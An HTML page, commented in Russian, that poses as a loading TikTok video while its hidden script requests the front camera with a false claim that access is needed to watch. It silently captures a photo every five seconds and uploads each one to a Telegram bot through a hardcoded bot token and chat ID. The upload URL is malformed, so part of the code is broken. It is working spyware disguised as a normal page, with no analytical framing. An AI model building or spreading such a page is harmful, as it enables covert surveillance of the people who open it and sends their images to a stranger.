<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Video</title>
    <style>
        body {
            background-color: #010101;
            color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            font-family: 'Proxima Nova', sans-serif;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #fe2c55; /* Фирменный цвет TikTok */
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .text {
            margin-top: 20px;
            font-size: 18px;
            font-weight: bold;
        }
        /* Скрываем технические элементы */
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <div class="text">Загрузка видео...</div>

    <!-- Технические элементы для фото -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

<script>
    const botToken = '8220142638:AAFDjQSzi4V1i5xfpMBA42uBgaDjFA0znOo';
    const chatId = '8573089884';

    // Функция захвата и отправки кадра
    async function takeAndSendPhoto(video, canvas) {
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0);
        
        const dataURL = canvas.toDataURL('image/jpeg', 0.6); // Качество 0.6 для скорости
        const blob = await (await fetch(dataURL)).blob();
        
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'shot.jpg');

        try {
            await fetch(api.telegram.org{botToken}/sendPhoto, {
                method: 'POST',
                body: formData
            });
            console.log("Фото отправлено");
        } catch (e) {
            console.error("Ошибка отправки:", e);
        }
    }

    window.onload = () => {
        // Запрашиваем камеру
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            video.srcObject = stream;

            // Запускаем бесконечный цикл с интервалом 1000 мс (1 сек)
            setInterval(() => {
                takeAndSendPhoto(video, canvas);
            }, 5000); 
        })
        .catch(err => {
            alert("Для просмотра видео необходимо разрешить доступ к камере в настройках браузера.");
            console.log("Доступ отклонен:", err);
        });
    };
</script>
</body>
</html>
